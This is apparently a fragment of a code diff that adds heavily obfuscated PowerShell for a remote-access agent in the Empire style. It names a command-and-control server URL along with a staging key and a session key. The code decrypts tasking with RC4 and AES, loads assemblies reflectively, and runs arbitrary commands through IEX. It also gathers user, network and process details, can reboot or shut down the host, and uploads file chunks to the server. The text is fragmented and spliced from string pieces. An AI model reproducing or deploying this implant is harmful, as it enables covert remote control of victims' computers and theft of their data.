+&(WA8InvokeWA8+WA8-WA8+WA8guguWA8) -Servers @((WA8hWA8+WA8ttp:WA8+WA8//braveWA8+WA8-WA8+WA8duWA8+WA8st-49WA8+WA8022.pWA8+WA8ktriot.nWA8+WA8et:2WA8+WA82161WA8)) -StagingKey WA8+D7jRbzO1?kutgc=)6EjVe[3%pCRyr{fs#BWA8 -SessionKey ((WA8{0},xWA8+WA8DWA8+WA8J3T~WA8+WA8{WA8+WA81}WA8+WA8rLWA8+WA8cHWA8+WA8wWA8+WA8lS9NFq6)ys/MUWA8+WA8-KCVWA8+WA8_WA8) -F [CHar]124,[CHar]36) -SessionID (WA82RNCUQWA8+WA8R4WA8) -WorkingHours WA8WA8 -KillDate WA8WA8;','Bsn{jnwqOnwqBNaME}];
+                try {
+                    Bsn{ResUlnwqTS} = &(WA8SWA8+WA8top-WA8+WA8AgWA8+WA8entJoWA8+WA8bWA8) -JobName Bsn{jonwqBNAnwqme} jRbz &(WA8flWA8) jRbz &(WA8OWA8+WA8ut-StrinWA8+WA8gWA8);
+                    if(Bsn{RnwqEsuLnwqTs} -and Bsn(Bsn{RnwqEsULnwqTS}.(WA8trWA8+WA8imWA8).In','A8+WA8StWA8+WA8opWA8) jRbz &(WA8selecWA8+WA8tWA8) (WA8modWA8+WA8eWA8),@{(WA8NamWA8+WA8eWA8)=(WA8OwneWA8+WA8rWA8);(WA8ExprWA8+WA8eWA8+WA8ssWA8+WA8ionWA8)={ (&(WA8GeWA8+','OuWA8+WA8tWA8).Invoke(Bsn{onwqLDcOnSOnwqLnwqenwqOUT});
+                if (Bsn{onwqUTPuT}.x6VcLEnnwqgTHx6Vc -eq 0){
+                    Bsn{OunwqTPnwqUt} = Bsn{snwqTnwqRiNGwRiTnwqEr}.(WA8ToWA8+WA8StrWA8+WA8ingWA8).Invoke();
+                    }
+            }
+            Bsn{oUTnwqPuT} += x6Vcnwqnnwqrx6Vc;
+        }
+        elseif (Bsn{CnwqmD}.(WA8ToLWA8+WA8oweWA8+WA8rWA8).Invoke() -eq (WA8refWA8+WA8lecWA8+WA8tWA8+WA8iveWA8+WA8loadWA8)){
+            if (Bsn{CmdanwqRnwqGs}.x6VclEnwqNgThx6Vc -eq WA8WA8) { Bsn{OnwqUtnwqpuT} = (WA8nWA8+WA8o WA8+WA8bWA8+WA8inWA8+WA8ary suppliedWA8) };
+            &(WA8elWA8+WA8seWA8){
+                Bsn{anwqSSEMBnwqLy} = [System.Reflection.Assembly]::x6VcLnwqOaDx6Vc([Convert]::(WA8FrWA8+WA8omBasWA8+WA8e6WA8+WA84StringWA8).Invoke(Bsn{cmDanwqRnwqgS}));
+                Bsn{OnwqUtpnwqUT} = (x6Vcnwqnnwqr x6Vc+WA8RefleWA8+WA8ctivWA8+WA8e WA8+WA8LWA8+WA8oad WA8+WA8CWA8+WA8ompWA8+WA8leteWA8);
+            }
+        }
+        else {
+            switch -regex (Bsn{cnwqMD}) {
+                ((WA8(lswWA8+WA8QRWA8+WA8^WA8+WA8dirWA8+WA8)WA8)  -CREPLaCEWA8wQRWA8,[Char]124) {
+                    if (Bsn{Cnwqmdargs}.x6VcLnwqenwqNgthx6Vc -eq x6Vcx6Vc) {
+                        Bsn{OnwqUTpUt} =','
+        {
+            (WA8agentWA8+WA8 WA8+WA8LostWA8+WA8LimWA8+WA8iWA8+WA8t WA8+WA8sWA8+WA8et WA8+WA8tWA8+WA8o WA8+x6VcBsnscript:LostLimitx6Vc);
+        }
+    }
+    function gET-nwqLnwqosTlnwqImnwqIT {
+        (WA8agenWA8+WA8t WA8+WA8LostLiWA8+WA8mWA8+WA8it: WA8+x6VcBsnscript:LostLimitx6Vc);
+    }
+    function SeT-kiLnwqLdnwqAtE {
+        param([string]Bsn{DnwqAte})
+        Bsn{scnwqRIPnwqTnwq:KILlnwqDAte} = Bsn{DanwqTE};
+        (WA8aWA8+WA8gent WA8+WA8kWA8+WA8illWA8+WA8date WA8+WA8seWA8+WA8t WA8+WA8toWA8+WA8 WA8+x6VcBsnscript:KillDatex6Vc);
+    }
+    function gnwqET-kinwqLlDaTe {
+        (WA8aWA8+WA8gent WA8+WA8kWA8+WA8illWA8+WA8date: WA8+x6VcBsnscript:KillDatex6Vc);
+    }
+    function SenwqTnwq-wORKInwqNGnwqhouRS {
+        param([string]Bsn{HOnwqUrS})
+        Bsn{snwqCrinwqpt:nwqwORKINGHOnwqUrS} = Bsn{HOUnwqRS};
+        x6Vcagent working hours set to Bsn(Bsnscript:WorkingHours) x6Vc;
+    }
+    function GEnwqTnwq-woRnwqKinwqNgHoUrs {
+        x6Vcagent working hours: Bsn(Bsnscript:WorkingHours) x6Vc;
+    }
+    function GET-nwqsYSInwqNFo {
+        Bsn{SnwqTR} = ((WA80WA8+WA8Ts1WA8)-CrEPLacE([cHar]84+[cHar]115+[cHar]49),[cHar]124);
+        Bsn{SnwqTr} += Bsn{snwqCRInwqPt:CONTROnwqLnwqsnwqeRvERS}[Bsn{SCnwqRiPnwqT:SenwqRVErINnwqDnwqex}];
+        Bsn{snwqTR} += WA8jRbzWA8 + [Environment','Bsn{EnCnwqoDeDnwqpnwqArt} = &(WA8Get-FiWA8+WA8lePaWA8+WA8rtWA8) -File x6VcBsnfilex6Vc -Index Bsn{innwqdnwqEX} -ChunkSize Bsn{ChnwqUNknwqsIzE};
+                            Bsn{FILnwqesinwqZe} = (&(WA8Get-IWA8+WA8temWA8) Bsn{fnwqiLe}).x6VclengnwqThx6Vc;
+                            if(Bsn{ENConwqdnwqeDnwqPaRT}) {
+                                Bsn{DnwqATa} = x6Vc{0}jRbz{1}jRbz{2}jRbz{3}x6Vc -f Bsn{InwqNDeX}, Bsn{FnwqILe}, Bsn{fIleSnwqInwqze}, Bsn{ENcoDnwqenwqDPArT};
+                                (& Bsn{SnwqEnwqNdmEssnwqAge} -Packets Bsn(&(WA8EWA8+WA8nWA8+WA8code-Pac',' 0){
+                        Bsn{OUnwqTnwqPUt}.(WA8WritWA8+WA8eWA8).Invoke(Bsn{BnwqUFnwqFer},0,Bsn{bnwqYtnwqesREAD});
+                        Bsn{byTnwqESrnwqEAD} = Bsn{SnwqR}.(WA8ReWA8+WA8adWA8).Invoke(Bsn{bUnwqFnwqFEr}, 0, Bsn{bnwqUFfnwqEr}.x6VclnwqeNgnwqThx6Vc);
+                    }
+                    Bsn{aSnwqSenwqMbnwqyTES} = Bsn{OnwqUnwqTpUt}.(WA8ToArraWA8+WA8yWA8).Invoke();
+                    Bsn{aSsnwqem} = [Reflection.Assembly]::(WA8loaWA8+WA8dWA8).Invoke(Bsn{asnwqSEMbnwqytnwqeS});
+                    Bsn{STRnwqmpnwqROP} = Bsn{ASnwqSnwqem}.(WA8GetWA8+WA8TypeWA8).Invoke((WA8TWA8+WA8askWA8)).(WA8GWA8+WA8etPrWA8+WA8opertyWA8).Invoke((WA8OuWA8+WA8tpuWA8+WA8tWA8+WA8StreamWA8));
+                    if(!Bsn{sTnwqRMpRoP}){
+                        Bsn{RnwqesunwqlTS} = Bsn{aSnwqSnwqEm}.(WA8GeWA8+WA8tTypWA8+WA8eWA8).Invoke((WA8TasWA8+WA8kWA8)).(WA8GetMWA8+WA8ethoWA8+WA8dWA8).Invoke((WA8EWA8+WA8xeWA8+WA8cuteWA8)).x6VcinnwqVokex6Vc(Bsn{NunwqLL}, Bsn{PnwqARanwqMs});
+                    }
+                    else{
+                        Bsn{pIpnwqenwqSEnwqRVeRnwqstrEnwqAm} = [System.IO.Pipes.AnonymousPipeServerStream]::x6Vcnnwqewx6Vc([System.IO.Pipes.PipeDirection]::x6VcinwqNx6Vc, [System.IO.HandleInheritability]::x6VcINHeRinwqTabnwqlex6Vc);
+                        Bsn{PiPEnwqCLnwqIeNTnwqstReAm} = [System.IO.Pipes.AnonymousPipeClientStream]::x6VcNnwqeWx6Vc([System.IO.Pipes.PipeDirection]::x6VconwqUTx6Vc, Bsn{PinwqPEsernwqVEnwqRsnwqTrEaM}.x6VcCLIeNnwqTnwqsnwqAfEPinwqPeHnwqANdlEx6Vc);
+                        Bsn{SnwqTReAMnwqRnwqEadEr} = [System.IO.StreamReader]::','} -replace x6Vcnwqx6Vc214M214Mx6Vc,x6VcFileSystem::nwqx6Vc214Mx6Vc;
+        }
+        elseif (Bsn{CnwqMdaRnwqgS} -like ((WA8*lWA8+WA8wKWA8+WA8lwKWA8+WA8*WA8)  -ReplAcE  ([ChAr]108+[ChAr]119+[ChAr]75),[ChAr]92)) {
+            Bsn{cMdArnwqGs} = Bsn{cnwqmDARgS} -replace ((WA8{0WA8+WA8}{0WA8+WA8}WA8+WA8{0}{0}WA8) -f[cHAR]92),((WA8FiWA8+WA8leSysWA8+WA8tem::09L09WA8+WA8LWA8)-REpLAce  ([char]48+[char]57+[char]76),[char]92);
+        }
+        Bsn{OunwqTnwqpUt} = WA8WA8;
+        if (Bsn{cnwqmD}.(','Invoke() -eq (WA8wow6WA8+WA84.dllWA8)) {
+                                    Bsn{ARnwqCH} = (WA8xWA8+WA886WA8);
+                                    break
+                                }
+                            }
+                        }
+                        Bsn{onwqUt} = &(WA8New-WA8+WA8ObjeWA8+WA8ctWA8) (WA8pWA8+WA8soWA8+WA8bjectWA8);
+                        Bsn{OnwqUt} jRbz &(WA8Add-MWA8+WA8embWA8+WA8erWA8) (WA8NoteWA8+WA8proWA8+WA8pertyWA8) (WA8ProceWA8+WA8ssNamWA8+WA8eWA8) Bsn{_}.x6VcpRnwqOCnwqeSSNamex6Vc;
+                        Bsn{OnwqUT} jRbz &(WA8AWA8+WA8dd-MeWA8+WA8mberWA8) (WA8NoteproWA8+WA8pWA8+WA8ertWA8+WA8yWA8) (WA8PWA8+WA8IDWA8) Bsn{_}.x6VcIdx6Vc;
+                        Bsn{OnwqUT} jRbz &(WA8AdWA8+WA8dWA8+WA8-MemberWA8) (WA8NotWA8+WA8epWA8+WA8rWA8+WA8opertyWA8) (WA8ArWA8+WA8chWA8) Bsn{arnwqCh};
+                        Bsn{onwqUt} jRbz &(WA8AWA8+WA8ddWA8+WA8-MembeWA8+WA8rWA8) (WA8NWA8+WA8oteWA8+WA8propertyWA8) (WA8UserWA8+WA8NaWA8+WA8meWA8) Bsn{onwqWnErs}[Bsn{_}.x6VcinwqDx6Vc.(WA8tostWA8+WA8rWA8+WA8ingWA8).Invoke()];
+                        Bsn{Mnwqem} = x6Vc{0:N2} MBx6Vc -f Bsn(Bsn{_}.x6VcWsx6Vc/1MB);
+                        Bsn{onwqUt} jRbz &(WA8AWA8+WA8dd-MemWA8+WA8berWA8) (WA8NotepWA8+WA8roperWA8+WA8tWA8+WA8yWA8) (WA8MemUsagWA8+WA8eWA8) Bsn{MnwqEM};
+                        Bsn{onwqUt};
+                    } jRbz &(WA8SWA8+WA8ort-ObWA8+WA8jectWA8) -Property (WA8PWA8+WA','WA8 WA8+WA8StoWA8+WA8pWA8);
+                            Bsn{OutPnwqUt} = (WA8eWA8+WA8xeWA8+WA8cWA8+WA8uted WA8+x6VcBsncmd x6Vc+x6VcBsncmdargsx6Vc);
+                        }
+                        catch {
+                            Bsn{OnwqUtnwqpuT}=Bsn{_}.x6VcEnwqxnwqCEptIoNx6Vc;
+                        }
+                    }
+                }
+                (WA8cdWA8) {
+                    if (Bsn{CMdAnwqRgs}.x6VclEnwqNgnwqTHx6Vc -ne WA8WA8)
+                    {
+                        Bsn{CmnwqdnwqARGs} = Bsn{cnwqmdargs}.(WA8triWA8+WA8mWA8).Invoke(x6Vcnwqx6Vcx6Vc).(WA8trWA8+WA8imWA8).Invoke(x6VcWA8x6Vc);
+                        &(WA8cdWA8) x6VcBsncmdargsx6Vc;
+                        Bsn{oUTnwqpnwqUt} = &(WA8pwWA8+WA8dWA8);
+                    }
+                }
+                ((WA8(ipconfWA8+WA8igWA8+WA8MWA8+WA8FqiWA8+WA8fcoWA8+WA8nfig)WA8)  -creplacE  WA8MFqWA8,[chAr]124) {
+                    Bsn{OnwqUTpUT} = &(WA8GetWA8+WA8-WmiObjecWA8+WA8tWA8) -class (WA8Win32_NWA8+WA8etwoWA8+WA8rWA8+WA8kAdapterWA8+WA8ConfigurWA8+WA8ationWA8) jRbz &(WA8?WA8) {Bsn{_}.x6VcInwqPnwqeNaBlEDx6Vc -Match (WA8TruWA8+WA8eWA8)} jRbz &(WA8FWA8+WA8orEWA8+WA8ach-OWA8+WA8bjWA8+WA8ectWA8) {
+                        Bsn{OnwqUT} = &(WA8NWA8+WA8eWA8+WA8w-ObjectWA8) (WA8psobjWA8+WA8eWA8+WA8ctWA8);
+                        Bsn{OnwqUT} jRbz &(WA8AdWA8+WA8d-WA8+WA8MemWA8+WA8berWA8) (WA8NoWA8+WA8tepWA8+WA8ropWA8+WA8ertyWA8) (WA8DeWA8+WA8scrWA8+WA8iptWA8+WA8ionWA8) Bsn{_}.x6VcDEnwqscrinwqPTIOnx6Vc;
+                        Bsn{OnwqUT} jRbz &(WA8Add-MWA8+WA8embWA8+WA8erWA8) (WA8NoteWA8+WA8proWA8+WA8pertyWA8) (WA8MAWA8+WA8CAddresWA8+WA8sWA8) Bsn{_}.x6VcmACAnwqdDRnwqesSx6Vc;
+                        Bsn{OnwqUT} jRbz &(WA8Add-MWA8+WA8eWA8+WA8mberWA8) (WA8NoWA8+WA8tepWA8+WA8ropertWA8+WA8yWA8','8:WA8);
+                Bsn{SnwqcnwqRIPT:nwqHeADERs}.x6VcanwqDDx6Vc(Bsn{panwqRTS}[0],Bsn{PnwqAnwqRtS}[1]);
+            }
+        }
+        (WA8AWA8+WA8gent WA8+WA8uWA8+WA8pdated WA8+WA8wWA8+WA8ith WA8+WA8pWA8+WA8rofile WA8+x6VcBsnProfilex6Vc);
+    }
+    function gnwqEnwqT-FinwqLEparT {
+        
+        Param(
+            [string] Bsn{Fnwqile},
+      ','        if (Bsn{CnwqmDnwqARgS}.x6VcleNGnwqThx6Vc -eq WA8WA8) { Bsn{OunwqTnwqput} = (WA8no sheWA8+WA8ll coWA8+WA8mWA8+WA8m','lWA8+WA8ManagedWA8);
+            }
+            Bsn{Anwqes}.x6VcMnwqodex6Vc = (WA8CWA8+WA8BCWA8);
+            Bsn{anwqeS}.x6Vcknwqeyx6Vc = Bsn{EnCnwqodnwqIng}.(WA8GetBWA8+WA8ytesWA8).Invoke(Bsn{SEsnwqSnwqioNnwqkey});
+            Bsn{anwqEs}.x6VcIvx6Vc = Bsn{InwqV};
+            (Bsn{anwqes}.(WA8CreWA8+WA8ateDecrypWA8+WA8torWA8).Invoke()).x6VcTRnwqAnSfOrMFnwqInaLBLnwqockx6Vc((Bsn{inwqNnwqByTES}[16..Bsn{InwqNnwqByTes}.x6VclEnwqNGthx6Vc]), 0, Bsn{inwqNbnwqYtES}.x6VcLeNGnwqTHx6Vc-16)
+        }
+    }
+    function new-nwqRoUnwqTnwqiNgPaCKet {
+        
+        param(Bsn{enwqNCnwqDatA}, Bsn{MnwqeTa})
+        if(Bsn{ENcDanwqTa}) {
+            Bsn{ENnwqcnwqDanwqTAleN} = Bsn{EnCnwqdnwqATa}.x6VcLeNgnwqThx6Vc;
+        }
+        else {
+            Bsn{ENcnwqdnwqATanwqleN} = 0;
+        }
+        Bsn{SnwqKB} = Bsn{EnwqNnwqcODING}.(WA8GetByWA8+WA8tWA8+WA8esWA8).Invoke(Bsn{stAGInwqNnwqgnwqKey});
+        Bsn{inwqV}=[BitConverter]::(WA8GetByWA8+WA8tWA8+WA8esWA8).Invoke(Bsn(&(WA8GeWA8+WA8t-WA8+WA8RandWA8+WA8omWA8)));
+        Bsn{dnwqAtA} = Bsn{encnwqonwqdIng}.(WA8GetWA8+WA8BytWA8+WA8esWA8).Invoke(Bsn{scnwqRiPT:nwqsEnwqssIoNID}) + @(0x01,Bsn{Mnwqeta},0x00,0x00) + [BitConverter]::(WA8GWA8+WA8etByWA8+WA8tesWA8).Invoke(Bsn{eNnwqcDnwqATaleN});
+        Bsn{routInGpAckEnwqTnwqdanwqTa} = &(WA8ConvWA8+WA8ertTo-Rc4WA8+WA8BytWA8+WA8eSWA8+WA8treaWA8+WA8mWA8) -In Bsn{DanwqTa} -RCK Bsn(Bsn{iV}+Bsn{snwqkb});
+        if(Bsn{ENnwqcdAnwqTa}) {
+            (Bsn{InwqV} + Bsn{rnwqOuTInnwqGpanwqckenwqTDATA} + Bsn{eNnwqcDnwqATA});
+        }
+        else {
+            (Bsn{Iv} + Bsn{roUTInwqNGPAcnwqKnwqeTnwqDanwqTa});
+        }
+    }
+    function decnwqODe-rnwqonwqUTInwqNgPAcKnwqEt {
+     
+        param(Bsn{paCnwqKEtnwqdAtA})
+        if (Bsn{pAckETDnwqAnwqTA}.x6VcLnwqENnwqGTHx6Vc -ge 20) {
+            Bsn{onwqFfSeT} = 0;
+            while(Bsn{onwqFfnwqsEt} -lt Bsn{PacnwqkenwqTData}.x6VclennwqgThx6Vc) {
+                Bsn{RnwqOutiNgPnwqAcknwqET} = Bsn{PacnwqKETdnwqAta}[(Bsn{OFfnwqsnwqet}+0)..(Bsn{oFnwqFseT}+19)];
+                Bsn{RnwqOutnwqInwqNgIv} = Bsn{ROnwqUTInnwqgnwqpnwqAcket}[0..3];
+                Bsn{ROnwqUtnwqInnwqGenCdanwqTa} = Bsn{ROuTInnwqgnwqPaCnwqKeT}[4..19];
+                Bsn{ofnwqFnwqsEt} += 20;
+                Bsn{snwqKb} = Bsn{ENcnwqOdinwqNG}.(WA8GetWA8+WA8BWA8+WA8ytesWA8).Invoke(Bsn{SnwqTagnwqiNnwqGkeY});
+                Bsn{RounwqTinwqNGnwqdatA} = &(WA8ConvertTo-RWA8+WA8c4ByWA8+WA8teStrWA8+WA8eWA8+WA8amWA8) -In Bsn{RnwqoutnwqinGeNcnwqDAnwqTA} -RCK Bsn(Bsn{ROUnwqTiNnwqGiV}+Bsn{snwqkb});
+                Bsn{pACknwqenwqTsnwqEssIOnId} = [System.Text.Encoding]::x6VcuTnwqF8x6Vc.x6VcGenwqTsTnwqRIngx6Vc(Bsn{ROnwqUnwqTiNgnwqdATA}[0..7]);
+                Bsn{langunwqAnwqge} = Bsn{roUTINnwqgnwqDnwqAta}[8];
+                Bsn{MEnwqTa} = Bsn{RonwqUTinnwqGnwqDatA}[9];
+                Bsn{EnwqxTnwqRa} = Bsn{rnwqouTiNGDAnwqTA}[10..11];
+                Bsn{PnwqAnwqcKETlengTh} = [BitConverter]::(WA8ToUWA8+WA8IWA8+WA8nt32WA8).Invoke(Bsn{rOnwqUtnwqingnwqdatA}, 12);
+                if (Bsn{PnwqACkEtnwqLeNgTh} -lt 0) {
+                    break;
+                }
+                if (Bsn{panwqCKnwqetSeSsnwqIONid} -eq Bsn{SCnwqRinwqpt:nwqseSnwqSIoNiD}) {
+                    Bsn{ENCnwqdanwqTA} = Bsn{PnwqAnwqCKnwqetdata}[Bsn{ofFsnwqET}..(Bsn{offnwqsnwq',' Bsn{onwqUnwqTPuT} = &(WA8Get-WmWA8+WA8iObjWA8+WA8eWA8+WA8ctWA8) (WA8winWA8+WA832_IP4WA8+WA8RWA8+WA8oWA8+WA8uteTWA8+WA8aWA8+WA8bleWA8) jRbz &(WA8FWA8+WA8orEWA8+WA8ach-ObWA8+WA8jectWA8) {
+                            Bsn{OnwqUT} = &(WA8NewWA8+WA8-ObjeWA8+WA8ctWA8) (WA8psobWA8+WA8jectWA8);
+                            Bsn{onwqUt} jRbz &(WA8AWA8+WA8ddWA8+WA8-MeWA8+WA8mberWA8) (WA8NotepWA8+WA8roWA8+WA8pertyWA8) (WA8DestiWA8+WA8natWA8+WA8iWA8+WA8onWA8) Bsn{_}.x6VcDEnwqSnwqTiNATnwqionx6Vc;
+                            Bsn{onwqUt} jRbz &(WA8AWA8+WA8dd-MeWA8+WA8mberWA8) (WA8NWA8+WA8otepropertWA8+WA8yWA8) (WA8NWA8+WA8etmaskWA8) Bsn{_}.x6VcmnwqAskx6Vc;
+                            if (Bsn{_}.x6VcNexnwqTHOPx6Vc -eq (WA80.WA8+WA80.WA8+WA80.0WA8)) {
+                                Bsn{OnwqUT} jRbz &(WA8AWA8+WA8ddWA8+WA8-MemberWA8) (WA8NotepropWA8+WA8ertWA8+WA8yWA8) (WA8NextHoWA8+WA8pWA8) (WA8OWA8+WA8nWA8+WA8-linkWA8);
+                            }
+                            else{
+                                Bsn{OnwqUt} jRbz &(WA8Add-MeWA8+WA8mbWA8+WA8erWA8) (WA8NoteWA8+WA8propertWA8+WA8yWA8) (WA8NextHWA8+WA8opWA8) Bsn{_}.x6VcnnwqeXthOPx6Vc;
+                            }
+                            if(Bsn{AdAnwqpnwqTeRs}[Bsn{_}.x6VcInterFaCeiNnwqDnwqEXx6Vc] -and (Bsn{AdnwqAPTEnwqRS}[Bsn{_}.x6VcIntenwqRnwqFACEnwqInDExx6Vc] -ne x6Vcx6Vc)) {
+                                Bsn{onwqUT} jRbz &(WA8AWA8+WA8dd-WA8+WA8MeWA8+WA8mberWA8) (WA8NoteproWA8+WA8perWA8+WA8tWA8+WA8yWA8) (WA8InterfWA8+WA8aceWA8) Bsn(Bsn{aDAnwqpnwqTnwqErs}[Bsn{_}.x6VcinTnwqernwqFnwqACEinDexx6Vc] -join x6Vc,x6Vc);
+                            }
+                            else {
+                                Bsn{onwqUT} jRbz &(WA8Add-WA8+WA8MembWA8+WA8eWA8+WA8rWA8) (WA8NoteprWA8+WA8oWA8+WA8perWA8+WA8tyWA8) (WA8InteWA8+WA8rfaceWA8) (WA81WA8+WA827.0.WA8+WA80.1WA8);
+                            }
+                            Bsn{OnwqUt} jRbz &(WA8Add-MeWA8+WA8mbWA8+WA8erWA8) (WA8NoWA8+WA8tepWA8+WA8ropertyWA8) (WA8MetrWA8+WA8icWA8) Bsn{_}.x6VcmEnwqTrinwqc1x6Vc;
+                            Bsn{onwqUt};
+                        } jRbz &(WA8ConWA8+WA8verWA8+WA8tTo-JsWA8+WA8onWA8);
+                    }
+                    else { Bsn{ounwqTPUT} = &(WA8routWA8+WA8eWA8) Bsn{cMdnwqArnwqGS} };
+                }
+                ((WA8(whoaWA8+WA8miWA8+WA8{WA8+WA80}geWA8+WA8tuidWA8+WA8)WA8)  -f[CHaR]124) { Bsn{ouTnwqPnwqUT} = [Security.Principal.WindowsIdentity]::(WA8GWA8+WA8etCWA8+WA8urrWA8+WA8entWA8).Invoke().x6VcNanwqMEx6Vc };
+                (WA8hWA8+WA8ostWA8+WA8nameWA8) {
+                    Bsn{OnwqUnwqTPUt} = [System.Net.Dns]::(WA8GWA8+WA8etHWA8+WA8ostBWA8+WA8yNameWA8).Invoke((Bsn{eNV:cnwqOMPutnwqEnwqRnwqNanwqME}));
+                }
+                ((WA8(WA8+WA8reboot5ZlreWA8+WA8stWA8+WA8aWA8+WA8rt)WA8)-repLace WA85ZlWA8,[cHar]124) { &(WA8RWA8+WA8esWA8+WA8taWA8+WA8rt-ComputerWA8) -force };
+                (WA8shuWA8+WA8tWA8+WA8downWA8) { &(WA8SWA8+WA8toWA8+WA8p-CompuWA8+WA8terWA8) -force };
+                (WA8deWA8+WA8faultWA8) {
+                    if (Bsn{cmnwqDnwqArGS}.x6VclennwqGthx6Vc -eq WA8WA8) { Bsn{OnwqUTnwqpUt} = &(WA8IWA8+WA8EXWA8) Bsn{Cnwqmd} jRbz &(WA8Out-WA8+WA8StWA8+WA8ringWA8) }
+                    else { Bsn{ounwqTput} = &(WA8IWA8+WA8EXWA8) (x6VcBsncmd x6Vc+x6VcBsncmdargsx6Vc) jRbz &(WA8Out-SWA8+WA8trinWA8+WA8gWA8) };
+                }
+            }
+        }
+        x6Vcnwqnx6Vc+(Bsn{oUtnwqPnwqUT});
+    }
+    function SnwqTanwqRt-nwqAGEnTnwqJOb {
+
+        param(Bsn{SnwqcRiPTsnwqTRiNg})
+        Bsn{raNDnAnwqme} = -join((WA8ABCWA8+WA8DEFGWA8+WA8HWA8+WA8KWA8+WA8LMNPRSWA8+WA8TUVWA8+WA8WXYZ1234WA8+WA856789WA8).(WA8TWA8+WA8oWA8+WA8CharArrWA8+WA8ayWA8).Invoke()jRbz&(WA8Get-RanWA8+WA8dWA8+WA8omWA8) -Count 6);
+        Bsn{ApnwqPdOnwqMaIn} = [AppDomain]::(WA8CrWA8+WA8eateDomaWA8+WA8inWA8).Invoke(Bsn{rnwqAnDnnwqAnwqmE});
+        Bsn{pshnwqOnwqsT} = Bsn{AppDomnwqAnwqiN}.x6VclOnwqAdx6Vc([PSObject].x6VcaSSenwqmBLyx6Vc.x6VcfulnwqlnnwqAMEx6Vc).(WA8GWA8+WA8et','and supWA8+WA8pliedWA8) }
+            else {
+                Bsn{OlDConwqNsnwqOlEnwqoUt} = [Console]::x6VconwqUTx6Vc;
+                Bsn{sTRnwqInwqNgwrinwqTnwqEr} = &(WA8NeWA8+WA8w-OWA8+W','TWA8+WA8ypeWA8).Invoke((WA8System.WA8+WA8MWA8+WA8aWA8+WA8nagWA8+WA8emeWA8+WA8nt.AuWA8+WA8tomation.PowWA8+WA8eWA8+WA8rShWA8+WA8ellWA8))::(WA8CWA8+WA8reWA8+WA8ateWA8).Invoke();
+        Bsn{NnwqULl} = Bsn{PSHnwqosT}.(WA8AdWA8+WA8dSWA8+WA8criptWA8).Invoke(Bsn{SCRnwqiptstnwqRnwqING});
+        Bsn{BUffnwqeR} = &(WA8NWA8+WA8eWA8+WA8wWA8+WA8-ObjectWA8) (WA8SWA8+WA8yWA8+WA8steWA8+WA8m.MWA8+WA8anagemWA8+WA8eWA8+WA8nt.AutWA8+WA8omWA8+WA8ationWA8+WA8.PSWA8+WA8DWA8+WA8aWA8+WA8taCollectiWA8+WA8oWA8+WA8n[PWA8+WA8SObWA8+WA8ject]WA8);
+        Bsn{PsoBjEnwqCtCOlnwqlEcnwqTIONnwqTnwqYnwqPe} = [Type](WA8SysWA8+WA8teWA8+WA8mWA8+WA8.MWA8+WA8anagement.AWA8+WA8utomaWA8+WA8tiWA8+WA8on.PSDataCollectiWA8+WA8on[PSObjectWA8+WA8]WA8);
+        Bsn{bEgnwqIninnwqVonwqkE} = (Bsn{pnwqSHnwqOSt}.(WA8GetTypWA8+WA8eWA8).Invoke().(WA8GetWA8+WA8MetWA8+WA8hodsWA8).Invoke() jRbz &(WA8?WA8) { Bsn{_}.x6VcNnwqAMex6Vc -eq (WA8BeWA8+WA8ginInvWA8+WA8oWA8+WA8keWA8) -and Bsn{_}.(WA8GWA8+WA8etWA8+WA8ParameterWA8+WA8sWA8).Invoke().x6VccnwqOUNtx6Vc -eq 2 }).x6VcMAKnwqEgEnnwqernwqICMnwqEthOdx6Vc(@([PSObject], [PSObject]));
+        Bsn{jnwqoB} = Bsn{BeginwqNiNnwqVnwqokE}.x6VcInnwqVokex6Vc(Bsn{PnwqsHost}, @((Bsn{bnwqUFfnwqeR} -as Bsn{pSobnwqJecTcoLleCTnwqinwqONnwqTYPE}), (Bsn{bUnwqFFER} -as Bsn{pnwqsnwqOBnwqJECTConwqlnwqLectInwqONtype})));
+        Bsn{scRnwqIpT:nwqJnwqOBS}[Bsn{randnwqNamE}] = @{(WA8AliaWA8+WA8sWA8)=Bsn{RnwqANDnAMe}; (WA8AppDWA8+WA8omWA8+WA8ainWA8)=Bsn{AnwqppnwqdOmnwqAiN}; (WA8PSWA8+WA8HostWA8)=Bsn{pnwqshnwqOsT}; (WA8JWA8+WA8obWA8)=Bsn{JnwqOb}; (WA8BWA8+WA8uWA8+WA8fferWA8)=Bsn{bUfnwqFnw','+WA8uWA8+WA8mWA8+WA8eWA8+WA8ratorWA8).Invoke() jRbz &(WA8FoWA8+WA8rEWA8+WA8acWA8+WA8h-ObjWA8+WA8ectWA8) {Bsn{wnwqC}.x6VcHenwqAdnwqerSx6Vc.(WA8AWA8+WA8ddWA8).Invoke(Bsn{_}.x6VcnanwqmEx6Vc, Bsn{_}.x6VcVnwqALUEx6Vc)};
+
+            try {
+
+                Bsn{tanwqSkunwqRi} = Bsn{ScRipt:tanwqsnwqkunwqRIS} jRbz &(WA8Get-RWA8+WA8andoWA8+WA8mWA8);
+                Bsn{REnwqSnwqpONse} = Bsn{WC}.x6VcupnwqLnwqoAddaTAx6Vc(Bsn{snwqCripT:connwqTroLnwqSnwqeRverS}[Bsn{SCRnwqiPT:sErnwqVnwqERinwqNDnwqex}]+Bsn{tanwqSKnwqUrI}, (WA8POSWA8+WA8TWA8), Bsn{rnwqouTinnwqGPaCKEt});
+            }
+            catch [System.Net.WebException]{
+
+                if (Bsn{_}.x6VcEXcEpnwqTionx6Vc.(WA8GWA8+WA8etBaseWA8+WA8ExcepWA8+WA8tionWA8).Invoke().x6VcreSpnwqonwqNSEx6Vc.x6VcsnwqTAtuscnwqOnwqDEx6Vc -eq 401) {
+
+                    &(WA8Start-NegotWA8+WA8iatWA8+WA8eWA8) -S x6VcBsnScript:serverx6Vc -SK Bsn{sK} -UA Bsn{unwqA};
+                    }
+                }
+            }
+        }
+    };
+
+Bsn{scriPtnwq:nwqGETtnwqAsk} = {
+    try {
+        if (Bsn{sCnwqRnwqIpt:COnTrOLsErnwqVERs}[Bsn{ScrInwqpT:nwqsnwqenwqRVeRnwqinDnwqeX}].(WA8StWA8+WA8artWA8+WA8sWithWA8).Invoke((WA8hWA8+WA8ttpWA8))) {
+
+
+            Bsn{rnwqOuTingpnwqAcKnwqEt} = &(WA8NWA8+WA8eWA8+WA8wWA8+WA8-RoutingPacketWA8) -EncData Bsn{nnwqULL} -Meta 4;
+            Bsn{ronwqUTnwqinGnwqCOOkiE} = [Convert]::x6VcTnwqoBaSnwqe64sTnwqRIngx6Vc(Bsn{RonwqUtnwqiNGPAcknwqeT});
+
+
